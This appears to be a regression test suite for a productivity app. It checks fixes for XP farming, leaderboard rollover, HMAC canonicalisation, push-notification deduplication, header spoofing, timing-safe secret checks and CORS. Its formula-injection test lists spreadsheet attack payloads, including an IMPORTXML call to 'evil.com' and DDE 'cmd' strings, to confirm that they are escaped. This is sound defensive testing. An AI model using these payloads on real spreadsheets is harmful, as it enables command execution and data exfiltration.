import './test_bootstrap.ts';
import { describe, it, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import http from 'node:http';
import express from 'express';
import type { NextFunction, Request, Response } from 'express';

import {
  awardAuthoritativeXP,
  getPaginatedGamificationLeaderboard,
} from '../server/gamificationService.ts';
import type { DatabaseSchema } from '../server/db.ts';
import {
  toCanonicalJson,
  computeAppsScriptHmac,
  dispatchAppsScriptWriteback,
} from '../server/appsScriptBridgeWorker.ts';
import { PushNotificationService } from '../server/integrations/pushNotificationService.ts';
import { requireUserContext } from '../server/auth.ts';
import { corsHandler } from '../server/security.ts';
import { cronNotificationRouter } from '../server/routes/cronNotificationRoutes.ts';
import { formatDateInTimezone } from '../src/lib/dateTime.ts';

function getIsoWeekKey(dateStr: string): string {
  const [y, m, d] = dateStr.split('-').map(Number);
  const dt = new Date(Date.UTC(y || 2026, (m || 1) - 1, d || 1));
  const dayNum = dt.getUTCDay() || 7;
  dt.setUTCDate(dt.getUTCDate() + 4 - dayNum);
  const yearStart = new Date(Date.UTC(dt.getUTCFullYear(), 0, 1));
  const weekNo = Math.ceil(((dt.getTime() - yearStart.getTime()) / 86400000 + 1) / 7);
  return `${dt.getUTCFullYear()}-W${String(weekNo).padStart(2, '0')}`;
}

function makeGamificationDb(): DatabaseSchema {
  return {
    users: [
      { id: 'u_farm', name: 'Farmer', email: 'f@example.com', avatarUrl: '', createdAt: new Date().toISOString() },
      { id: 'u_stale', name: 'Stale Top', email: 's@example.com', avatarUrl: '', createdAt: new Date().toISOString() },
      { id: 'u_active', name: 'Active Player', email: 'a@example.com', avatarUrl: '', createdAt: new Date().toISOString() },
    ],
    userSettings: [
      {
        userId: 'u_farm',
        currency: 'INR',
        timezone: 'Asia/Kolkata',
        pomodoroWorkDuration: 25,
        shortBreakDuration: 5,
        longBreakDuration: 15,
        autoSwitchSessions: false,
        soundEnabled: true,
        theme: 'dark',
        dailyFocusGoalMinutes: 60,
      },
      {
        userId: 'u_stale',
        currency: 'INR',
        timezone: 'Asia/Kolkata',
        pomodoroWorkDuration: 25,
        shortBreakDuration: 5,
        longBreakDuration: 15,
        autoSwitchSessions: false,
        soundEnabled: true,
        theme: 'dark',
        dailyFocusGoalMinutes: 60,
      },
      {
        userId: 'u_active',
        currency: 'INR',
        timezone: 'Asia/Kolkata',
        pomodoroWorkDuration: 25,
        shortBreakDuration: 5,
        longBreakDuration: 15,
        autoSwitchSessions: false,
        soundEnabled: true,
        theme: 'dark',
        dailyFocusGoalMinutes: 60,
      },
    ],
    tasks: [],
    focusSessions: [
      {
        id: 'sess_today_goal',
        userId: 'u_farm',
        taskId: null,
        mode: 'work',
        durationMinutes: 75,
        durationSeconds: 4500,
        completed: true,
        startedAt: new Date().toISOString(),
        endedAt: new Date().toISOString(),
      },
    ],
    categories: [],
    recurringExpenses: [],
    bills: [],
    incomeTransactions: [],
    expenseTransactions: [],
    paymentHistory: [],
    timeBlocks: [],
    savingsGoals: [],
    subscriptions: [],
    envelopes: [],
    auditLogs: [],
    syncQueue: [],
    studyTiers: [],
    studySubjects: [],
    studyTopics: [],
    studyRevisions: [],
    studyMistakes: [],
    gamificationProfiles: [],
    xpTransactions: [],
  };
}

describe('Regression Suite for 8 Security, Gamification, Push & Apps Script Bridge Bugs', () => {
  const prevEnv = {
    NODE_ENV: process.env.NODE_ENV,
    REQUIRE_AUTH: process.env.REQUIRE_AUTH,
    ALLOW_GUEST: process.env.ALLOW_GUEST,
    DEMO_MODE: process.env.DEMO_MODE,
    CRON_SECRET: process.env.CRON_SECRET,
    ALLOWED_ORIGINS: process.env.ALLOWED_ORIGINS,
    APP_URL: process.env.APP_URL,
  };

  afterEach(() => {
    process.env.NODE_ENV = prevEnv.NODE_ENV;
    if (prevEnv.REQUIRE_AUTH === undefined) delete process.env.REQUIRE_AUTH;
    else process.env.REQUIRE_AUTH = prevEnv.REQUIRE_AUTH;
    if (prevEnv.ALLOW_GUEST === undefined) delete process.env.ALLOW_GUEST;
    else process.env.ALLOW_GUEST = prevEnv.ALLOW_GUEST;
    if (prevEnv.DEMO_MODE === undefined) delete process.env.DEMO_MODE;
    else process.env.DEMO_MODE = prevEnv.DEMO_MODE;
    if (prevEnv.CRON_SECRET === undefined) delete process.env.CRON_SECRET;
    else process.env.CRON_SECRET = prevEnv.CRON_SECRET;
    if (prevEnv.ALLOWED_ORIGINS === undefined) delete process.env.ALLOWED_ORIGINS;
    else process.env.ALLOWED_ORIGINS = prevEnv.ALLOWED_ORIGINS;
    if (prevEnv.APP_URL === undefined) delete process.env.APP_URL;
    else process.env.APP_URL = prevEnv.APP_URL;
  });

  describe('Bug #1: Gamification Infinite XP Farming (daily_goal) Exploit Fix', () => {
    it('rejects arbitrary daily_goal sourceIds and permits at most one award per dailyKey', () => {
      const db = makeGamificationDb();
      const todayKey = formatDateInTimezone(new Date(), 'Asia/Kolkata');

      // Attempt farming with forged sourceIds on same day
      const forged1 = awardAuthoritativeXP(db, 'u_farm', {
        eventId: 'ev_farm_1',
        source: 'daily_goal',
        sourceId: 'day_1',
      });
      const forged2 = awardAuthoritativeXP(db, 'u_farm', {
        eventId: 'ev_farm_2',
        source: 'daily_goal',
        sourceId: 'day_2',
      });
      assert.equal(forged1.awarded, false);
      assert.equal(forged1.xpAdded, 0);
      assert.equal(forged2.awarded, false);
      assert.equal(forged2.xpAdded, 0);
      assert.equal(db.gamificationProfiles?.find((p) => p.userId === 'u_farm')?.totalXP || 0, 0);

      // Legitimate canonical dailyKey award succeeds once
      const valid = awardAuthoritativeXP(db, 'u_farm', {
        eventId: 'ev_goal_real_1',
        source: 'daily_goal',
        sourceId: todayKey,
      });
      assert.equal(valid.awarded, true);
      assert.ok(valid.xpAdded >= 25);

      // Second attempt on same day with different eventId is blocked
      const repeat = awardAuthoritativeXP(db, 'u_farm', {
        eventId: 'ev_goal_real_2',
        source: 'daily_goal',
        sourceId: todayKey,
      });
      assert.equal(repeat.awarded, false);
      assert.equal(repeat.alreadyAwarded, true);
      assert.equal(repeat.xpAdded, 0);
    });
  });

  describe('Bug #2: Gamification Leaderboard Weekly/Monthly Period Rollover', () => {
    it('zeros stale weeklyXP and monthlyXP when p.weekKey / p.monthKey lag current period', () => {
      const db = makeGamificationDb();
      const todayKey = formatDateInTimezone(new Date(), 'Asia/Kolkata');
      const currentWeek = getIsoWeekKey(todayKey);
      const currentMonth = todayKey.slice(0, 7);

      db.gamificationProfiles = [
        {
          userId: 'u_stale',
          totalXP: 5000,
          level: 11,
          dailyXP: 400,
          weeklyXP: 3200,
          monthlyXP: 4500,
          dailyKey: '2020-01-01',
          weekKey: '2020-W01',
          monthKey: '2020-01',
          longestStreak: 10,
          currentStreak: 0,
          unlockedAchievementIds: [],
          achievementUnlockedAt: {},
          awardedMilestoneLevels: [],
        },
        {
          userId: 'u_active',
          totalXP: 250,
          level: 1,
          dailyXP: 50,
          weeklyXP: 150,
          monthlyXP: 250,
          dailyKey: todayKey,
          weekKey: currentWeek,
          monthKey: currentMonth,
          longestStreak: 3,
          currentStreak: 3,
          unlockedAchievementIds: [],
          achievementUnlockedAt: {},
          awardedMilestoneLevels: [],
        },
      ];

      const weeklyLb = getPaginatedGamificationLeaderboard(db, 'u_active', { category: 'weekly' });
      assert.equal(weeklyLb.entries[0].userId, 'u_active');
      assert.equal(weeklyLb.entries[0].totalXP, 150);
      assert.equal(weeklyLb.entries[1].userId, 'u_stale');
      assert.equal(weeklyLb.entries[1].totalXP, 0);

      const monthlyLb = getPaginatedGamificationLeaderboard(db, 'u_active', { category: 'monthly' });
      assert.equal(monthlyLb.entries[0].userId, 'u_active');
      assert.equal(monthlyLb.entries[0].totalXP, 250);
      assert.equal(monthlyLb.entries[1].userId, 'u_stale');
      assert.equal(monthlyLb.entries[1].totalXP, 0);

      // All-time still keeps historical lifetime totalXP
      const allTimeLb = getPaginatedGamificationLeaderboard(db, 'u_active', { category: 'all_time' });
      assert.equal(allTimeLb.entries[0].userId, 'u_stale');
      assert.equal(allTimeLb.entries[0].totalXP, 5000);
    });
  });

  describe('Bug #3: Apps Script Bridge Formula Sanitization & Recursive Canonical JSON', () => {
    it('recursively canonicalizes nested object keys so expectedIdentity order never alters HMAC', () => {
      const secret = 'apps_script_recursive_secret';
      const p1 = {
        action: 'write_cell',
        signature: 'old_sig',
        expectedIdentity: {
          subtopic: 'AVL Trees',
          topic: 'Trees',
          module: 'Data Structures',
        },
        value: 'Completed',
      };
      const p2 = {
        value: 'Completed',
        expectedIdentity: {
          module: 'Data Structures',
          topic: 'Trees',
          subtopic: 'AVL Trees',
        },
        action: 'write_cell',
      };

      const c1 = toCanonicalJson(p1);
      const c2 = toCanonicalJson(p2);
      assert.equal(c1, c2);
      assert.equal(
        c1,
        '{"action":"write_cell","expectedIdentity":{"module":"Data Structures","subtopic":"AVL Trees","topic":"Trees"},"value":"Completed"}'
      );
      assert.equal(computeAppsScriptHmac(c1, secret), computeAppsScriptHmac(c2, secret));
    });

    it('escapes formula-injection string values (=, +, -, @, tab, cr) before signing and dispatching', async () => {
      const payloads = [
        '=IMPORTXML("http://evil.com","//a")',
        '+cmd|" /C calc"!A0',
        '-2+3+cmd|" /C calc"!A0',
        '@SUM(1+1)*cmd',
        '\t=1+1',
        '\r=1+1',
      ];
      const secret = 'formula_test_secret_123';

      for (const dangerous of payloads) {
        let dispatchedBody: any = null;
        await dispatchAppsScriptWriteback(
          {
            spreadsheetId: 'FocusFlow Writeback Test',
            sheetTitle: 'DSA',
            rowNumber: 3,
            colLetter: 'E',
            value: dangerous,
          },
          {
            webAppUrl: 'https://script.google.com/macros/s/test/exec',
            secret,
            fetchImpl: async (_url, init) => {
              dispatchedBody = JSON.parse(String(init?.body || '{}'));
              return new Response(
                JSON.stringify({
                  success: true,
                  updatedCell: 'DSA!E3',
                  value: dispatchedBody.value,
                  updatedAt: new Date().toISOString(),
                }),
                { status: 200, headers: { 'Content-Type': 'application/json' } }
              );
            },
          }
        );

        assert.equal(dispatchedBody.value, `'${dangerous}`);
        assert.equal(
          dispatchedBody.signature,
          computeAppsScriptHmac(toCanonicalJson(dispatchedBody), secret)
        );
      }
    });
  });

  describe('Bug #4 & #5: Push Notification Service Atomic Cron Claims, Budget/Focus Alerts, >500 Chunking, Device Status & Test Push', () => {
    it('prevents concurrent cron duplicates via atomic ledger.create() and evaluates real budget + focus alerts', async () => {
      const service = new PushNotificationService();
      const ledgerStore = new Map<string, any>();
      const sentNotifications: Array<{ title: string; body: string; category: string }> = [];
      const uid = `usr_push_cron_${Date.now()}`;
      const todayIst = formatDateInTimezone(new Date(), 'Asia/Kolkata');

      service.setMessagingForTesting({
        sendEachForMulticast: async (msg: any) => {
          sentNotifications.push({
            title: msg.notification.title,
            body: msg.notification.body,
            category: msg.data.category,
          });
          return {
            successCount: msg.tokens.length,
            failureCount: 0,
            responses: msg.tokens.map(() => ({ success: true })),
          };
        },
      });

      service.setFirestoreForTesting({
        collection: (col: string) => {
          if (col === 'users') {
            return {
              get: async () => ({ docs: [{ id: uid, data: () => ({ id: uid }) }] }),
              doc: (docId: string) => ({
                collection: (subCol: string) => {
                  if (subCol === 'fcm_installations') {
                    const docs = [
                      {
                        id: 'inst_active',
                        data: () => ({ installationId: 'inst_active', token: 'tok_cron_1', enabled: true }),
                        ref: { id: 'inst_active' },
                      },
                    ];
                    return {
                      where: () => ({ get: async () => ({ empty: false, docs }) }),
                      get: async () => ({ empty: false, docs }),
                    };
                  }
                  if (subCol === 'settings') {
                    return {
                      doc: (sId: string) => ({
                        get: async () => {
                          if (sId === 'default') {
                            return {
                              exists: true,
                              data: () => ({
                                timezone: 'Asia/Kolkata',
                                currency: 'INR',
                                monthlyBudgetPaise: 100000,
                                dailyFocusGoalMinutes: 60,
                                notificationPrefs: {
                                  enabled: true,
                                  budgetWarnings: true,
                                  budgetWarningPercent: 80,
                                  dailyFocusGoal: true,
                                  taskDeadlines: false,
                                  upcomingBills: false,
                                  overdueBills: false,
                                },
                              }),
                            };
                          }
                          return { exists: false, data: () => null };
                        },
                      }),
                    };
                  }
                  if (subCol === 'expenses') {
                    return {
                      get: async () => ({
                        docs: [
                          {
                            data: () => ({
                              id: 'exp_cron_1',
                              amountPaise: 95000, // 95% of 100000 monthly budget
                              date: todayIst,
                              type: 'variable',
                              description: 'Groceries',
                            }),
                          },
                        ],
                      }),
                    };
                  }
                  if (subCol === 'focus_sessions') {
                    return {
                      get: async () => ({
                        docs: [
                          {
                            data: () => ({
                              id: 'fs_cron_1',
                              mode: 'work',
                              completed: true,
                              durationMinutes: 70,
                              durationSeconds: 4200,
                              startedAt: new Date().toISOString(),
                            }),
                          },
                        ],
                      }),
                    };
                  }
                  if (subCol === 'notification_delivery_ledger') {
                    return {
                      doc: (entryId: string) => ({
                        create: async (data: any) => {
                          // Yield briefly before atomic check? Simulate immediate atomic map check
                          if (ledgerStore.has(entryId)) {
                            const err: any = new Error('Document already exists');
                            err.code = 6;
                            throw err;
                          }
                          ledgerStore.set(entryId, data);
                        },
                        update: async (data: any) => {
                          ledgerStore.set(entryId, { ...(ledgerStore.get(entryId) || {}), ...data });
                        },
                        delete: async () => {
                          ledgerStore.delete(entryId);
                        },
                      }),
                    };
                  }
                  return { get: async () => ({ docs: [] }) };
                },
              }),
            };
          }
          return { get: async () => ({ docs: [] }) };
        },
      });

      // Run two concurrent cron invocations in parallel
      const [resA, resB] = await Promise.all([
        service.processScheduledNotifications(),
        service.processScheduledNotifications(),
      ]);

      // Exactly 2 notifications total (Budget warning + Daily Focus Goal), never duplicated by concurrent run
      assert.equal(resA.dispatchedCount + resB.dispatchedCount, 2);
      assert.equal(sentNotifications.length, 2);
      assert.ok(sentNotifications.some((n) => n.category === 'budget' && /95%/.test(n.title)));
      assert.ok(sentNotifications.some((n) => n.category === 'focus' && /Focus Goal Reached/.test(n.title)));
    });

    it('chunks >500 tokens per FCM multicast call, chunks stale token deletes, filters disabled devices, and allows test push despite category opt-outs', async () => {
      const service = new PushNotificationService();
      const uid = `usr_push_bulk_${Date.now()}`;

      // 1,200 enabled devices + 2 disabled devices in collection
      const allDeviceDocs = Array.from({ length: 1200 }, (_, i) => ({
        id: `inst_${i}`,
        data: () => ({ installationId: `inst_${i}`, token: `tok_${i}`, enabled: true, lastSeenAt: '' }),
        ref: { id: `inst_${i}` },
      }));
      const disabledDocs = [
        {
          id: 'inst_dis_1',
          data: () => ({ installationId: 'inst_dis_1', token: 'tok_dis_1', enabled: false, lastSeenAt: '' }),
          ref: { id: 'inst_dis_1' },
        },
      ];

      const multicastChunkSizes: number[] = [];
      const cleanupBatchSizes: number[] = [];
      const deletedIds: string[] = [];

      service.setMessagingForTesting({
        sendEachForMulticast: async (msg: { tokens: string[] }) => {
          multicastChunkSizes.push(msg.tokens.length);
          assert.equal(msg.tokens.length <= 500, true, 'FCM sendEachForMulticast must never receive >500 tokens');
          const responses = msg.tokens.map((tok) => {
            const idx = Number(tok.replace('tok_', ''));
            if (idx < 510) {
              return { success: false, error: { code: 'messaging/registration-token-not-registered' } };
            }
            return { success: true };
          });
          const successCount = responses.filter((r) => r.success).length;
          return {
            successCount,
            failureCount: msg.tokens.length - successCount,
            responses,
          };
        },
      });

      let focusDisabledMode = false;
      service.setFirestoreForTesting({
        collection: () => ({
          doc: () => ({
            collection: (subCol: string) => {
              if (subCol === 'settings') {
                return {
                  doc: () => ({
                    get: async () => ({
                      exists: true,
                      data: () => ({
                        notificationPrefs: {
                          enabled: !focusDisabledMode,
                          focusCompletion: !focusDisabledMode,
                        },
                      }),
                    }),
                  }),
                };
              }
              if (subCol === 'fcm_installations') {
                return {
                  where: (_field: string, _op: string, val: boolean) => ({
                    get: async () => {
                      const docs = allDeviceDocs.filter((d) => d.data().enabled === val);
                      return { empty: docs.length === 0, docs };
                    },
                  }),
                  get: async () => ({ empty: false, docs: [...allDeviceDocs, ...disabledDocs] }),
                };
              }
              return { get: async () => ({ docs: [] }) };
            },
          }),
        }),
        batch: () => {
          const ops: string[] = [];
          return {
            delete: (ref: { id: string }) => {
              ops.push(ref.id);
              if (ops.length > 500) {
                throw new Error('Firestore cleanup batch exceeded 500 operations');
              }
            },
            commit: async () => {
              cleanupBatchSizes.push(ops.length);
              deletedIds.push(...ops);
            },
          };
        },
      });

      // 1. Bulk send across 1,200 tokens
      const bulkRes = await service.sendNotification(uid, {
        title: 'Bulk Announcement',
        body: 'Test chunking',
        category: 'focus',
      });
      assert.deepEqual(multicastChunkSizes, [500, 500, 200]);
      assert.equal(bulkRes.delivered, 690);
      assert.equal(bulkRes.failed, 510);
      assert.deepEqual(cleanupBatchSizes, [450, 60]);
      assert.equal(deletedIds.length, 510);

      // 2. getDeviceStatus must exclude disabled devices (even when all enabled devices cleared)
      const statusWithEnabled = await service.getDeviceStatus(uid);
      assert.equal(statusWithEnabled.deviceCount, 1200);

      // Simulate collection containing ONLY disabled device
      service.setFirestoreForTesting({
        collection: () => ({
          doc: () => ({
            collection: () => ({
              where: () => ({ get: async () => ({ empty: true, docs: [] }) }),
              get: async () => ({ empty: false, docs: disabledDocs }),
            }),
          }),
        }),
      });
      const disabledStatus = await service.getDeviceStatus(uid);
      assert.equal(disabledStatus.enabled, false);
      assert.equal(disabledStatus.deviceCount, 0);

      // 3. sendTestNotification bypasses focusCompletion: false / enabled: false
      focusDisabledMode = true;
      service.setFirestoreForTesting({
        collection: () => ({
          doc: () => ({
            collection: (subCol: string) => {
              if (subCol === 'settings') {
                return {
                  doc: () => ({
                    get: async () => ({
                      exists: true,
                      data: () => ({ notificationPrefs: { enabled: false, focusCompletion: false } }),
                    }),
                  }),
                };
              }
              return {
                where: () => ({
                  get: async () => ({ empty: false, docs: [allDeviceDocs[600]] }),
                }),
              };
            },
          }),
        }),
        batch: () => ({ delete: () => {}, commit: async () => {} }),
      });

      const testPushRes = await service.sendTestNotification(uid);
      assert.equal(testPushRes.delivered, 1);
      assert.equal((testPushRes as any).skipped, undefined);
    });
  });

  describe('Bug #6: Guest Session IP Spoofing Protection (requireUserContext)', () => {
    it('ignores spoofed X-Forwarded-For headers when proxy is not trusted', async () => {
      process.env.NODE_ENV = 'test';
      delete process.env.REQUIRE_AUTH;

      const makeReq = (xff: string) =>
        ({
          path: '/tasks',
          headers: {
            'x-forwarded-for': xff,
            'user-agent': 'Mozilla/5.0 Same Browser',
          },
          socket: { remoteAddress: '10.20.30.40' },
          ip: '10.20.30.40',
          app: { get: () => false }, // trust proxy = false
        }) as unknown as Request;

      const req1 = makeReq('1.2.3.4');
      const req2 = makeReq('5.6.7.8');
      const next = (() => {}) as NextFunction;
      const res = {} as Response;

      await requireUserContext(req1, res, next);
      await requireUserContext(req2, res, next);

      const auth1 = (req1 as any).auth;
      const auth2 = (req2 as any).auth;
      assert.ok(auth1.userId.startsWith('gst_'));
      assert.equal(
        auth1.userId,
        auth2.userId,
        'Spoofed X-Forwarded-For must not alter guest session ID when trust proxy is disabled'
      );
    });
  });

  describe('Bug #7: Cron Notification Router Constant-Time CRON_SECRET Check', () => {
    it('uses crypto.timingSafeEqual instead of === and enforces exact CRON_SECRET verification', async () => {
      const source = fs.readFileSync(
        path.resolve(process.cwd(), 'server/routes/cronNotificationRoutes.ts'),
        'utf8'
      );
      assert.match(source, /crypto\.timingSafeEqual/);
      assert.equal(/=== expectedSecret/.test(source), false, 'Must not compare CRON_SECRET with ===');

      process.env.CRON_SECRET = 'super_secret_cron_val_999';
      const app = express();
      app.use('/api', cronNotificationRouter);
      const server = http.createServer(app);
      await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
      const { port } = server.address() as { port: number };

      try {
        const badRes = await fetch(`http://127.0.0.1:${port}/api/cron/notifications`, {
          method: 'POST',
          headers: { Authorization: 'Bearer super_secret_cron_val_000' },
        });
        assert.equal(badRes.status, 401);

        const goodRes = await fetch(`http://127.0.0.1:${port}/api/cron/notifications`, {
          method: 'POST',
          headers: { 'x-cron-secret': 'super_secret_cron_val_999' },
        });
        assert.equal(goodRes.status, 200);
      } finally {
        server.close();
      }
    });
  });

  describe('Bug #8: CORS sameHostOrigin Protocol Verification', () => {
    it('blocks HTTP same-host origin when request is HTTPS while allowing matching HTTPS origin', () => {
      process.env.NODE_ENV = 'production';
      delete process.env.ALLOWED_ORIGINS;
      delete process.env.APP_URL;

      const runCors = (reqProps: Partial<Request>) => {
        const headers: Record<string, string> = {};
        let nextCalled = false;
        corsHandler(
          { method: 'GET', ...reqProps } as unknown as Request,
          {
            setHeader(k: string, v: string) {
              headers[k.toLowerCase()] = v;
            },
          } as unknown as Response,
          () => {
            nextCalled = true;
          }
        );
        return { headers, nextCalled };
      };

      // 1. Downgrade attempt: HTTP origin against HTTPS server with identical host must be blocked
      const downgraded = runCors({
        protocol: 'https',
        headers: {
          host: 'app.focusflow.com',
          origin: 'http://app.focusflow.com',
        },
      });
      assert.equal(downgraded.nextCalled, true);
      assert.equal(downgraded.headers['access-control-allow-origin'], undefined);
      assert.equal(downgraded.headers['access-control-allow-credentials'], undefined);

      // 2. Valid HTTPS same-origin matches scheme & host -> allowed with credentials
      const validHttps = runCors({
        protocol: 'https',
        headers: {
          host: 'app.focusflow.com',
          origin: 'https://app.focusflow.com',
        },
      });
      assert.equal(validHttps.nextCalled, true);
      assert.equal(validHttps.headers['access-control-allow-origin'], 'https://app.focusflow.com');
      assert.equal(validHttps.headers['access-control-allow-credentials'], 'true');
    });
  });
});

